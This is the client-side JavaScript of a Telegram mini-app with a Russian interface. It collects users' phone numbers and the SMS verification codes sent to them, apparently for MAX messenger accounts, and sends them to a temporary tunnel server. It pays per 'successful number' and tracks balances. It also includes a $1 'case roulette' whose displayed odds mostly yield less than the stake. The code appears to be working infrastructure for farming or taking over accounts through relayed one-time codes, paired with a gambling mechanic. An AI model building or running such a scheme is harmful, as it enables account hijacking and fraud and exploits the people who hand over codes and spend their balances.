const tg = window.Telegram.WebApp; tg.expand(); tg.ready();

const API_BASE = "https://cyprus-mp-snake-bristol.trycloudflare.com/api"; // замени на свой
const user = tg.initDataUnsafe?.user || {};
const user_id = user?.id;
const username = user?.username || user?.first_name || "user";
const $ = (s)=>document.querySelector(s);

/* helpers */
async function post(path, data){
  try{
    const r = await fetch(`${API_BASE}${path}`,{
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({...data, initData: tg.initData})
    });
    if(!r.ok) throw new Error(`HTTP ${r.status}`);
    return await r.json();
  }catch(e){ console.error(e); return {ok:false, error:String(e)}; }
}
function setAria(el, hidden){ el.setAttribute("aria-hidden", hidden ? "true" : "false"); if(hidden) el.setAttribute("inert",""); else el.removeAttribute("inert"); }
function show(id){
  document.querySelectorAll(".card").forEach(e=>{ const hide=(e.id!==id); e.classList.toggle("hidden",hide); setAria(e,hide); });
  if(id==="menu"){ loadLogs(); startLogsPolling(); } else { stopLogsPolling(); }
  if(id==="screen-submit") setTimeout(()=>$("#phone")?.focus(),0);
}

/* nav */
document.querySelectorAll("#menu button[data-screen]").forEach(b=>{
  b.onclick=()=>{
    const sc=b.getAttribute("data-screen");
    if(sc==="stats"){ loadStats(); show("screen-stats"); return; }
    if(sc==="submit"){ show("screen-submit"); return; }
    if(sc==="report"){ loadReport(); show("screen-report"); return; }
    if(sc==="roulette"){ setupCase(); show("screen-roulette"); return; }
    show("todo");
  };
});
document.querySelectorAll(".back").forEach(b=> b.onclick=()=>show("menu"));
document.getElementById("refreshLogs").onclick = loadLogs;

/* bootstrap */
(async ()=>{ await post("/bootstrap",{user_id,username}); })();

/* stats */
async function loadStats(){
  const j = await post("/stats",{user_id});
  const s = (j && j.stats) || {};
  $("#statsBox").textContent =
`Пользователь: ${s.username || username}
ID: ${user_id ?? "—"}
Регистрация: ${s.first_seen || "—"}
Успешных номеров: ${Number(s.success_count ?? 0)}
Неуспешных номеров: ${Number(s.fail_count ?? 0)}
Всего заработано: ${Number(s.earned ?? 0)}
Баланс: ${Number(s.balance ?? 0)}`;
}

/* LOG CHAT */
function escapeHtml(s){ return String(s).replace(/[&<>"']/g, m=>({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[m])) }
async function loadLogs(){
  const j = await post("/logs",{user_id});
  const list = (j && j.events) || [];
  const chat = $("#chat"); chat.innerHTML = "";
  if(list.length===0){ chat.innerHTML = "<div class='bubble b-system'><div>Пусто</div></div>"; return; }
  for(const ev of list){
    const cls = ev.role==="user" ? "b-user" : ev.role==="admin" ? "b-admin" : "b-system";
    const el = document.createElement("div");
    el.className = `bubble ${cls}`;
    el.innerHTML = `<div>${escapeHtml(ev.text)}</div><div class="meta">${ev.ts}</div>`;
    chat.appendChild(el);
  }
  chat.scrollTop = chat.scrollHeight;
}
let logsTimer=null;
function startLogsPolling(){ if(logsTimer) return; logsTimer=setInterval(()=>{ const menu=$("#menu"); if(menu && !menu.classList.contains("hidden")) loadLogs(); },5000); }
function stopLogsPolling(){ if(logsTimer){ clearInterval(logsTimer); logsTimer=null; }}

/* submit MAX */
let submission_id=null;
$("#sendPhone").onclick=async ()=>{
  const phone=$("#phone").value.trim(); if(!phone){ alert("Введите номер"); $("#phone").focus(); return; }
  const j=await post("/submit_phone",{user_id,username,phone});
  if(j.ok){
    submission_id=j.submission_id;
    const panel=$("#codePanel");
    panel.classList.remove("hidden");
    panel.removeAttribute("inert");
    panel.setAttribute("aria-hidden","false");
    const ci=$("#code");
    ci.value=""; ci.removeAttribute("readonly"); ci.disabled=false;
    setTimeout(()=>ci.focus({preventScroll:true}), 0);
    alert("Номер отправлен. Введите код из SMS.");
  } else alert("Ошибка отправки номера");
};
$("#sendCode").onclick=async ()=>{
  const ci=$("#code"); const code=ci.value.trim();
  if(!submission_id){ alert("Сначала отправьте номер телефона"); return; }
  if(!code){ alert("Введите код"); ci.focus(); return; }
  const j=await post("/submit_code",{user_id,submission_id,code});
  if(j.ok){
    alert("Код отправлен. Ожидайте решения.");
    $("#phone").value=""; ci.value=""; $("#codePanel").classList.add("hidden"); $("#codePanel").setAttribute("aria-hidden","true");
    show("menu"); loadLogs();
  } else alert("Ошибка отправки кода");
};
$("#code").addEventListener("keydown",(e)=>{ if(e.key==="Enter"){ e.preventDefault(); $("#sendCode").click(); }});

/* REPORT: мои номера */
async function loadReport(){
  const j = await post("/my_numbers",{user_id});
  const arr = (j && j.rows) || [];
  const box = $("#reportList"); box.innerHTML = "";
  if(arr.length===0){ box.innerHTML = "<div class='bubble b-system'>Нет номеров</div>"; return; }
  const tbl = document.createElement("div");
  tbl.className="chat"; // визуально как список
  for(const r of arr){
    const div=document.createElement("div"); div.className="bubble b-system";
    div.innerHTML = `<div><b>${r.phone}</b> • ${r.status}</div>
                     <div class="meta">Время: ${r.minutes} мин • Заработано: $${Number(r.earned).toFixed(2)}</div>`;
    tbl.appendChild(div);
  }
  box.appendChild(tbl);
}
document.getElementById("reportRefresh").onclick = loadReport;

/* CASE roulette (как было) */
const caseStrip = ()=>document.getElementById("case-strip");
function weightedTile(){ const r=Math.random(); let lo,hi; if(r<0.88){ lo=0.10; hi=0.70; } else if(r<0.98){ lo=0.70; hi=0.99; } else { lo=1.00; hi=1.30; } return Number((lo + Math.random()*(hi-lo)).toFixed(2)); }
function buildStrip(win, n=60){ const arr = Array.from({length:n-1}, weightedTile); arr.push(Number(win.toFixed(2))); return arr; }
function renderStrip(values){ const strip = caseStrip(); strip.innerHTML=""; for(const v of values){ const d=document.createElement("div"); d.className="case-tile"; d.innerHTML=`<div class="icon">💵</div><div>$${v.toFixed(2)}</div>`; strip.appendChild(d);} }
function animateToLast(onDone){ const strip = caseStrip(); const tiles = [...strip.querySelectorAll(".case-tile")]; const winEl = tiles[tiles.length-1]; const wrap = strip.parentElement.getBoundingClientRect(); const winCenter = winEl.offsetLeft + winEl.offsetWidth/2; const target = Math.max(0, winCenter - wrap.width/2); strip.style.transition="none"; strip.style.transform="translateX(0px)"; requestAnimationFrame(()=>{ strip.style.transition="transform 4.2s cubic-bezier(0.08, 0.6, 0, 1)"; strip.style.transform=`translateX(${-target}px)`;}); const done = ()=>{ strip.removeEventListener("transitionend", done); onDone&&onDone(); }; strip.addEventListener("transitionend", done); }
function setupCase(){ const placeholder = buildStrip(weightedTile(), 40); renderStrip(placeholder); $("#ru-result").textContent="—"; }
let ruBusy=false;
document.getElementById("ru-spin").onclick = async ()=>{ if(ruBusy) return; ruBusy=true; $("#ru-result").textContent="Покупка…"; const res = await post("/roulette_spin",{user_id}); if(!res.ok){ ruBusy=false; if(res.error==="NO_FUNDS"){ alert("Недостаточно средств: нужно $1"); loadLogs(); } else alert("Ошибка рулетки"); return; } const strip = buildStrip(Number(res.win), 72); renderStrip(strip); $("#ru-result").textContent="Крутится…"; animateToLast(()=>{ $("#ru-result").textContent = `Выигрыш: $${Number(res.win).toFixed(2)} • Баланс: $${Number(res.balance).toFixed(2)}`; ruBusy=false; loadStats(); loadLogs(); }); };

/* ripple */
document.addEventListener("click",(e)=>{ const btn = e.target.closest("button"); if(!btn) return; const r = btn.getBoundingClientRect(); btn.style.setProperty("--rx",(e.clientX-r.left)+"px"); btn.style.setProperty("--ry",(e.clientY-r.top)+"px"); btn.classList.add("rippling"); setTimeout(()=>btn.classList.remove("rippling"),500); });

/* start */
show("menu");
setupCase();
